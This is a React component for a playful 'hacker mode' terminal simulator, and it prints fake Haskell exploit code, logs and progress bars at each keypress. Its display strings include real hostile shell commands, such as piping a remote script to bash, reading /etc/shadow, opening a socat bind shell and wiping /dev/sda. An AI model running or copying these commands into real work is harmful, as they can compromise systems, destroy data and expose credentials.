"use client";

import { useCallback, useEffect, useRef, useState } from "react";

// ── Haskell-looking code fragments ──────────────────────────────────────────
const HASKELL_SNIPPETS = [
	"module Exploit.Kernel where",
	"import Control.Monad.Trans.State",
	"import Data.ByteString.Lazy qualified as BL",
	"import Network.Socket hiding (recv, send)",
	"import Crypto.Cipher.AES (AES256)",
	"",
	"newtype Payload = Payload { unPayload :: ByteString }",
	"  deriving (Show, Eq, Generic, NFData)",
	"",
	"class Monad m => Exploitable m where",
	"  inject  :: Payload -> Addr -> m (Either SyscallError ())",
	"  exfil   :: Addr -> Int -> m ByteString",
	"  escalate :: Uid -> m Uid",
	"",
	"data KernelState = KernelState",
	"  { _ksRing      :: !Ring",
	"  , _ksPayloads  :: !(Map Addr Payload)",
	"  , _ksPrivLevel :: !PrivLevel",
	"  } deriving (Generic)",
	"",
	"makeLenses ''KernelState",
	"",
	"rootShell :: (MonadIO m, Exploitable m) => m ()",
	"rootShell = do",
	"  uid <- escalate (Uid 0)",
	"  when (uid /= Uid 0) $ throwError EscalationFailed",
	'  liftIO $ putStrLn "root@target:~#"',
	"",
	"bufferOverflow :: ByteString -> StateT KernelState IO ()",
	"bufferOverflow shellcode = do",
	"  let addr = 0x7FFFFFFFDE80",
	"  ksPayloads . at addr ?= Payload shellcode",
	"  ksPrivLevel .= Ring0",
	"  lift $ threadDelay 100000",
	"",
	"traverseNetwork :: [Host] -> ExploitM [Credential]",
	"traverseNetwork = foldM go []",
	"  where",
	"    go acc host = do",
	"      creds <- extractCredentials host",
	"      pure (acc <> creds)",
	"",
	"instance Exploitable (StateT KernelState IO) where",
	"  inject (Payload bs) addr = liftIO $ do",
	'    fd <- openMem "/dev/mem" ReadWrite',
	"    poke (castPtr addr) bs",
	"    pure (Right ())",
	"",
	"  exfil addr n = liftIO $",
	'    BL.toStrict <$> mmapFileByteStringLazy "/proc/kcore" (Just (addr, n))',
	"",
	"  escalate uid = do",
	"    ksPrivLevel .= Ring0",
	"    pure uid",
	"",
	"decrypt :: AES256 -> CipherText -> Either CryptoError PlainText",
	"decrypt key ct = do",
	"  iv  <- makeIV (BL.take 16 ct) ?? IVError",
	"  let pt = cbcDecrypt key iv (BL.drop 16 ct)",
	"  pure (PlainText pt)",
	"",
	"main :: IO ()",
	"main = do",
	"  args <- getArgs",
	'  let target = fromMaybe "127.0.0.1" (listToMaybe args)',
	"  sock <- connectTo target 4444",
	"  evalStateT rootShell initialKernelState",
	"  closeSock sock",
	"",
	"type ExploitM = StateT KernelState (ExceptT ExploitError IO)",
	"",
	"runExploit :: ExploitM a -> IO (Either ExploitError a)",
	"runExploit = runExceptT . flip evalStateT initialKernelState",
	"",
	"hashCrack :: ByteString -> HashDB -> Maybe PlainText",
	"hashCrack h db = Map.lookup (SHA256.hash h) (db ^. rainbowTable)",
];

// ── Log messages ────────────────────────────────────────────────────────────
const LOG_MESSAGES = [
	"[sshd] Accepted publickey for root from 10.13.37.42 port 22 ssh2",
	"[kernel] SELinux: enforcing mode disabled by exploit module",
	"[systemd] Started reverse-shell.service",
	"[audit] USER_AUTH pid=1337 uid=0 auid=4294967295 ses=4294967295",
	"[NetworkManager] <info> wlan0: supplicant connection state: associating",
	"[sudo] root : TTY=pts/0 ; PWD=/ ; COMMAND=/bin/sh",
	"[cron] (root) CMD (/usr/local/bin/exfil --quiet --daemon)",
	"[kernel] iptables: DROP IN=eth0 OUT= SRC=192.168.1.1 DST=10.0.0.42",
	"[sshd] error: Received disconnect from 203.0.113.0: Bye [preauth]",
	"[kernel] TCP: Possible SYN flooding on port 443. Sending cookies.",
	"[auditd] op=syscall(59) exe=/usr/bin/nc key=reverse_shell res=success",
	"[systemd] Starting Encrypted DNS Tunnel Service...",
	"[ntpd] time correction of +3600s — clock skew exploit active",
	"[ufw] BLOCK IN=eth0 OUT= SRC=10.0.0.1 PROTO=TCP DPT=22",
	"[kernel] usb 2-1: new device found, idVendor=dead, idProduct=beef",
	"[dmesg] [  42.069] Loading custom kernel module: rootkit.ko",
	"[journal] Process 31337 (hack) dumped core",
	"[pam_unix] session opened for user root by (uid=0)",
	"[rsyslog] imudp: module loaded — listening on *:514",
	"[fail2ban] WARNING [sshd] Found 203.0.113.42 — already banned",
];

// ── System commands ─────────────────────────────────────────────────────────
const SYSTEM_COMMANDS = [
	"$ nmap -sV -O -p- 10.0.0.0/24",
	"$ cat /etc/shadow | head -5",
	"$ chmod +s /bin/bash",
	"$ curl -s http://10.13.37.1/payload.sh | bash",
	"$ tcpdump -i eth0 -nn -X port 443",
	"$ gcc -o exploit exploit.c -lpthread -ldl",
	"$ dd if=/dev/zero of=/dev/sda bs=512 count=1  # jk",
	"$ awk '{print $2}' /proc/net/tcp | sort -u",
	"$ strings /proc/1/mem | grep -i password",
	"$ find / -perm -4000 -type f 2>/dev/null",
	"$ openssl s_client -connect target:443 -quiet",
	"$ python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
	"$ ip route add 10.0.0.0/8 via 192.168.1.1",
	"$ mount -t cifs //DC01/C$ /mnt/share -o user=admin",
	"$ journalctl -u sshd --since '5 minutes ago'",
	"$ ghc -O2 -threaded Exploit.hs -o pwn",
	"$ strace -p 1337 -e trace=network",
	"$ objdump -d /usr/sbin/sshd | grep -A5 'auth_password'",
	"$ tar czf /tmp/.hidden/loot.tar.gz /home/*/",
	"$ ssh -D 9050 -N -f proxy@10.13.37.1",
];

// ── Generators ──────────────────────────────────────────────────────────────

function randomHex(len: number): string {
	return Array.from({ length: len }, () =>
		Math.floor(Math.random() * 16)
			.toString(16)
			.toLowerCase(),
	).join("");
}

function randomIP(): string {
	return `${10 + Math.floor(Math.random() * 240)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

function timestamp(): string {
	const h = String(Math.floor(Math.random() * 24)).padStart(2, "0");
	const m = String(Math.floor(Math.random() * 60)).padStart(2, "0");
	const s = String(Math.floor(Math.random() * 60)).padStart(2, "0");
	return `${h}:${m}:${s}`;
}

let haskellIdx = 0;

interface OutputLine {
	text: string;
	color: "green" | "yellow" | "red" | "cyan" | "dim" | "white";
}

function pickRandom<T>(arr: T[]): T {
	return arr[Math.floor(Math.random() * arr.length)]!;
}

function nextLines(): OutputLine[] {
	const roll = Math.random();

	// Haskell code block (30%)
	if (roll < 0.3) {
		const count = 2 + Math.floor(Math.random() * 5);
		const lines: OutputLine[] = [];
		for (let i = 0; i < count; i++) {
			const line = HASKELL_SNIPPETS[haskellIdx % HASKELL_SNIPPETS.length]!;
			haskellIdx++;
			lines.push({ text: line, color: "cyan" });
		}
		return lines;
	}

	// Log message (25%)
	if (roll < 0.55) {
		const ts = timestamp();
		const msg = pickRandom(LOG_MESSAGES);
		const isError = msg.includes("error") || msg.includes("DROP") || msg.includes("BLOCK");
		return [{ text: `${ts} ${msg}`, color: isError ? "red" : "dim" }];
	}

	// System command + output (20%)
	if (roll < 0.75) {
		const cmd = pickRandom(SYSTEM_COMMANDS);
		const lines: OutputLine[] = [{ text: cmd, color: "white" }];
		// Sometimes add output lines
		const outputCount = Math.floor(Math.random() * 3);
		for (let i = 0; i < outputCount; i++) {
			const r = Math.random();
			if (r < 0.3) {
				lines.push({
					text: `  ${randomIP()}:${1024 + Math.floor(Math.random() * 64000)}  ESTABLISHED`,
					color: "green",
				});
			} else if (r < 0.6) {
				lines.push({
					text: `  0x${randomHex(8)}  ${Array.from({ length: 8 }, () => randomHex(2)).join(" ")}  |${Array.from({ length: 8 }, () => String.fromCharCode(33 + Math.floor(Math.random() * 93))).join("")}|`,
					color: "dim",
				});
			} else {
				lines.push({
					text: `  ${pickRandom(["root", "www-data", "postgres", "admin", "nobody"])}:$6$${randomHex(8)}$${randomHex(32)}`,
					color: "yellow",
				});
			}
		}
		return lines;
	}

	// Hex dump (15%)
	if (roll < 0.9) {
		const count = 1 + Math.floor(Math.random() * 4);
		const baseAddr = Math.floor(Math.random() * 0xffffffff);
		return Array.from({ length: count }, (_, i) => {
			const addr = (baseAddr + i * 16).toString(16).padStart(8, "0");
			const bytes = Array.from({ length: 16 }, () => randomHex(2)).join(" ");
			return { text: `0x${addr}  ${bytes}`, color: "dim" as const };
		});
	}

	// Random warning/status (10%)
	const warnings = [
		"*** FIREWALL RULE MODIFIED — INBOUND 0.0.0.0/0 ACCEPT ***",
		`*** CREDENTIALS FOUND: admin:${randomHex(12)} ***`,
		`*** NEW HOST DISCOVERED: ${randomIP()} (${pickRandom(["DC01", "FILESERV", "WEBPROXY", "MAIL01", "DB-PROD"])}) ***`,
		"*** PRIVILEGE ESCALATION SUCCESSFUL — UID 0 ***",
		`*** EXFILTRATING ${Math.floor(Math.random() * 999) + 1}MB TO ${randomIP()} ***`,
		"*** IDS EVASION ACTIVE — FRAGMENTING PACKETS ***",
		"*** CERTIFICATE PINNING BYPASSED ***",
	];
	return [{ text: pickRandom(warnings), color: "yellow" }];
}

// ── Progress bar state ──────────────────────────────────────────────────────

interface ProgressBar {
	id: number;
	label: string;
	current: number;
	target: number;
	speed: number;
}

let progressId = 0;

function makeProgressBar(): ProgressBar {
	const labels = [
		"Downloading /etc/shadow",
		"Cracking hash",
		"Exfiltrating data",
		"Compiling exploit",
		"Uploading payload",
		"Scanning ports",
		"Decrypting volume",
		"Brute forcing auth",
		"Mapping network",
		"Injecting shellcode",
		"Cloning repository",
		"Extracting firmware",
	];
	return {
		id: progressId++,
		label: pickRandom(labels),
		current: 0,
		target: 100,
		speed: 0.5 + Math.random() * 4,
	};
}

function renderProgressBar(pb: ProgressBar): string {
	const width = 30;
	const filled = Math.round((pb.current / pb.target) * width);
	const bar = `${"█".repeat(filled)}${"░".repeat(width - filled)}`;
	const pct = `${Math.round(pb.current)}%`;
	return `[${bar}] ${pct.padStart(4)} ${pb.label}`;
}

// ── Prompt commands (typed one word at a time) ──────────────────────────────

const PROMPT_COMMANDS = [
	"nmap -sV -O -p- --script=vuln 10.0.0.0/24",
	"cat /etc/shadow | awk -F: '{print $1, $2}'",
	"ssh -o StrictHostKeyChecking=no root@10.13.37.42",
	"curl -s http://10.13.37.1/payload.sh | bash",
	"ghc -O2 -threaded Exploit.hs -o pwn && ./pwn",
	"tcpdump -i eth0 -nn -X port 443 | tee capture.pcap",
	"python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
	"openssl s_client -connect target:443 -quiet",
	"find / -perm -4000 -type f 2>/dev/null",
	"mount -t cifs //DC01/C$ /mnt/share -o user=admin",
	"tar czf /tmp/.hidden/loot.tar.gz /home/*/",
	"strings /proc/1/mem | grep -i password",
	"dd if=/dev/urandom of=/dev/sda bs=1M count=1 # jk",
	"iptables -A INPUT -j ACCEPT && echo 'firewall down'",
	"gcc -fno-stack-protector -z execstack exploit.c -o pwn",
	"runhaskell -XOverloadedStrings Exfiltrate.hs --target=*",
	"strace -p $(pgrep sshd) -e trace=network 2>&1 | head",
	"objdump -d /usr/sbin/sshd | grep -A5 'auth_password'",
	"stack exec -- exploit --payload=reverse_shell --port=4444",
	"cabal run crack-hash -- --rainbow /tmp/hashes.db",
	"chmod 777 /etc/passwd && echo 'permissions bypassed'",
	"ip route add 10.0.0.0/8 via 192.168.1.1 dev eth0",
	"socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh",
	"hashcat -m 1800 -a 0 shadow.txt rockyou.txt --force",
];

function nextPromptCommand(): string[] {
	return pickRandom(PROMPT_COMMANDS).split(" ");
}

// ── Component ───────────────────────────────────────────────────────────────

interface HackerSimProps {
	onExit: () => void;
}

const COLORS: Record<OutputLine["color"], string> = {
	green: "text-green-400",
	yellow: "text-yellow-400",
	red: "text-red-400",
	cyan: "text-cyan-400",
	dim: "text-green-700",
	white: "text-green-200",
};

export function HackerSim({ onExit }: HackerSimProps) {
	const [phase, setPhase] = useState<"splash" | "hacking">("splash");
	const [lines, setLines] = useState<OutputLine[]>([]);
	const [activeBars, setActiveBars] = useState<ProgressBar[]>([]);
	const [frozen, setFrozen] = useState(false);
	const [isFullscreen, setIsFullscreen] = useState(false);
	const [promptText, setPromptText] = useState("");
	const containerRef = useRef<HTMLDivElement>(null);
	const scrollRef = useRef<HTMLDivElement>(null);
	const onExitRef = useRef(onExit);
	const frozenRef = useRef(false);
	const phaseRef = useRef(phase);
	const promptWordsRef = useRef<string[]>(nextPromptCommand());
	const promptIndexRef = useRef(0);
	const progressIntervalRef = useRef<ReturnType<typeof setInterval>>(undefined);
	onExitRef.current = onExit;
	phaseRef.current = phase;

	// Toggle fullscreen
	const toggleFullscreen = useCallback(() => {
		if (!containerRef.current) return;
		if (document.fullscreenElement) {
			document.exitFullscreen();
		} else {
			containerRef.current.requestFullscreen();
		}
	}, []);

	// Track fullscreen state
	useEffect(() => {
		const handler = () => setIsFullscreen(!!document.fullscreenElement);
		document.addEventListener("fullscreenchange", handler);
		return () => document.removeEventListener("fullscreenchange", handler);
	}, []);

	// Auto-scroll on new lines
	// biome-ignore lint/correctness/useExhaustiveDependencies: intentionally scroll on lines/activeBars/promptText change
	useEffect(() => {
		scrollRef.current?.scrollTo({ top: scrollRef.current.scrollHeight });
	}, [lines, activeBars, promptText]);

	// Tick active progress bars (only when hacking)
	useEffect(() => {
		if (phase !== "hacking") return;

		progressIntervalRef.current = setInterval(() => {
			setActiveBars((prev) => {
				const updated = prev
					.map((pb) => ({
						...pb,
						current: Math.min(pb.target, pb.current + pb.speed * (0.5 + Math.random())),
					}))
					.filter((pb) => pb.current < pb.target);

				const completed = prev.filter((pb) => !updated.find((u) => u.id === pb.id));
				if (completed.length > 0) {
					setLines((prevLines) => [
						...prevLines,
						...completed.map((pb) => ({
							text: `[✓] ${pb.label} — DONE`,
							color: "green" as const,
						})),
					]);
				}

				return updated;
			});
		}, 80);

		return () => clearInterval(progressIntervalRef.current);
	}, [phase]);

	const handleKey = useCallback(
		(e: KeyboardEvent) => {
			if (e.key === "Escape") {
				if (isFullscreen) {
					document.exitFullscreen();
					return;
				}
				onExitRef.current();
				return;
			}

			// F11 or Ctrl+Shift+F for fullscreen
			if (e.key === "F11" || (e.ctrlKey && e.shiftKey && e.key === "F")) {
				e.preventDefault();
				toggleFullscreen();
				return;
			}

			if (["Shift", "Control", "Alt", "Meta"].includes(e.key)) return;

			// Splash → hacking on first keypress
			if (phaseRef.current === "splash") {
				setPhase("hacking");
				setLines([
					{ text: "root@mainframe:~# ./exploit --stealth --target=*", color: "white" },
					{ text: "[*] Initializing attack framework...", color: "dim" },
					{ text: "", color: "green" },
				]);
				return;
			}

			if (frozenRef.current) return;

			// Random freeze (15% chance, 200-800ms)
			if (Math.random() < 0.15) {
				frozenRef.current = true;
				setFrozen(true);
				const delay = 200 + Math.floor(Math.random() * 600);
				setTimeout(() => {
					frozenRef.current = false;
					setFrozen(false);
				}, delay);
			}

			// Maybe spawn a progress bar (5% chance, max 3 concurrent)
			if (Math.random() < 0.05) {
				setActiveBars((prev) => {
					if (prev.length >= 3) return prev;
					return [...prev, makeProgressBar()];
				});
			}

			// Advance prompt typing — one word per keypress
			const words = promptWordsRef.current;
			const idx = promptIndexRef.current;
			if (idx < words.length) {
				// Add next word
				const typed = words.slice(0, idx + 1).join(" ");
				setPromptText(typed);
				promptIndexRef.current = idx + 1;
			} else {
				// Command fully typed — "execute" it: flush to log, start new command
				const fullCmd = words.join(" ");
				setLines((prev) => [
					...prev,
					{ text: `root@mainframe:~# ${fullCmd}`, color: "white" as const },
				]);
				setPromptText("");
				promptWordsRef.current = nextPromptCommand();
				promptIndexRef.current = 0;
			}

			const newLines = nextLines();
			setLines((prev) => [...prev, ...newLines]);
		},
		[isFullscreen, toggleFullscreen],
	);

	useEffect(() => {
		window.addEventListener("keydown", handleKey);
		return () => window.removeEventListener("keydown", handleKey);
	}, [handleKey]);

	// ── Splash screen ─────────────────────────────────────────────────────
	if (phase === "splash") {
		return (
			// biome-ignore lint/a11y/useKeyWithClickEvents: keyboard handled via window listener
			// biome-ignore lint/a11y/noStaticElementInteractions: splash acts as click target
			<div
				ref={containerRef}
				className="flex flex-1 flex-col items-center justify-center bg-[#0a0a0a] font-pixel"
				onClick={() => {
					setPhase("hacking");
					setLines([
						{ text: "root@mainframe:~# ./exploit --stealth --target=*", color: "white" },
						{ text: "[*] Initializing attack framework...", color: "dim" },
						{ text: "", color: "green" },
					]);
				}}
			>
				{/* Scanline overlay */}
				<div className="pointer-events-none fixed inset-0 z-10 bg-[repeating-linear-gradient(0deg,rgba(0,0,0,0.15)_0px,rgba(0,0,0,0.15)_1px,transparent_1px,transparent_2px)]" />

				<pre className="cursor-blink text-center text-[7px] leading-tight text-green-400 sm:text-[10px]">
					{[
						" ██▓███   ██▀███  ▓█████   ██████   ██████ ",
						"▓██░  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▒██    ▒",
						"▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░ ▓██▄   ░ ▓██▄  ",
						"▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒  ▒   ██▒",
						"▒██▒ ░  ░░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒",
						"▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░",
						"░▒ ░       ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░",
						"░░         ░░   ░    ░   ░  ░  ░  ░  ░  ░  ",
						"            ░        ░  ░      ░        ░   ",
					].join("\n")}
				</pre>
				<div className="cursor-blink mt-4 text-center text-base tracking-[0.5em] text-green-400 sm:text-2xl">
					<span className="hidden sm:inline">ANY KEY TO HACK</span>
					<span className="sm:hidden">TAP TO HACK</span>
				</div>
				<div className="mt-6 text-[10px] tracking-wider text-green-700 sm:text-xs">
					<span className="hidden sm:inline">[ESC] disconnect · [F11] fullscreen</span>
					<span className="sm:hidden">TAP SCREEN TO HACK · [EXIT] TO LEAVE</span>
				</div>
			</div>
		);
	}

	// ── Hacking mode ──────────────────────────────────────────────────────
	return (
		// biome-ignore lint/a11y/useKeyWithClickEvents: clicking exits, keyboard handled via window listener
		// biome-ignore lint/a11y/noStaticElementInteractions: hacker sim container acts as click target
		<div
			ref={containerRef}
			className="flex flex-1 flex-col bg-[#0a0a0a]"
			onClick={() => {
				// On mobile, taps simulate keypresses to generate hacker text
				if (frozenRef.current) return;
				handleKey(new KeyboardEvent("keydown", { key: "a" }));
			}}
		>
			{/* Scanline overlay for CRT feel */}
			<div className="pointer-events-none fixed inset-0 z-10 bg-[repeating-linear-gradient(0deg,rgba(0,0,0,0.15)_0px,rgba(0,0,0,0.15)_1px,transparent_1px,transparent_2px)]" />

			{/* Fullscreen hint */}
			<div className="flex items-center justify-between border-b border-green-900/50 px-4 py-1 text-[10px] text-green-700">
				<span>HACKER MODE v1.337</span>
				<span className="hidden sm:inline">
					[ESC] exit · [F11] fullscreen{isFullscreen ? " (active)" : ""}
				</span>
				<button
					type="button"
					className="font-pixel text-green-500 sm:hidden"
					onClick={(e) => {
						e.stopPropagation();
						onExitRef.current();
					}}
				>
					[EXIT]
				</button>
			</div>

			<div ref={scrollRef} className="flex-1 overflow-y-auto p-4 font-mono text-xs leading-relaxed">
				{lines.map((line, i) => (
					<div
						// biome-ignore lint/suspicious/noArrayIndexKey: output-only append list
						key={i}
						className={`min-h-[1.4em] whitespace-pre-wrap ${COLORS[line.color]}`}
					>
						{line.text}
					</div>
				))}

				{/* Active progress bars */}
				{activeBars.map((pb) => (
					<div key={pb.id} className="min-h-[1.4em] whitespace-pre-wrap text-yellow-400">
						{renderProgressBar(pb)}
					</div>
				))}

				{/* Cursor line with typing prompt */}
				<div className="min-h-[1.4em]">
					<span className="text-green-600">root@mainframe:~# </span>
					{promptText && <span className="text-green-300">{promptText}</span>}
					{frozen ? (
						<span className="text-yellow-400">█</span>
					) : (
						<span className="cursor-blink inline-block h-[1em] w-[0.6em] translate-y-[0.15em] bg-green-400" />
					)}
				</div>
			</div>
		</div>
	);
}
